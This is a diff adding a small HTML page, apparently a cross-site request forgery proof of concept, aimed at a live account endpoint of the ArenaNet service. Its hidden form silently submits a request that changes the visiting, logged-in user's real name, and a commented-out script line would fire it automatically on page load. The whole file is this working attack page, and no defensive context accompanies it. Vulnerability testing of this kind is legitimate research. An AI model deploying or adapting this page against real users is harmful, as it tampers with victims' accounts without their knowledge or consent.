@@ -1,0 +1,28 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Arena CSRF Test</title>
+</head>
+<body>
+  <h2>CSRF test</h2>
+
+  <form id="csrf"
+        action="https://account.arena.net/modals/change-realname.json"
+        method="POST"
+        target="result">
+
+    <input type="hidden" name="_formName" value="change-realname">
+    <input type="hidden" name="realname" value="CSRF-TEST-ACCOUNT-2">
+
+    <button type="submit">Send test</button>
+  </form>
+
+  <iframe name="result" style="width:100%;height:300px"></iframe>
+
+  <script>
+    // Uncomment to send automatically:
+    // document.getElementById("csrf").submit();
+  </script>
+</body>
+</html>
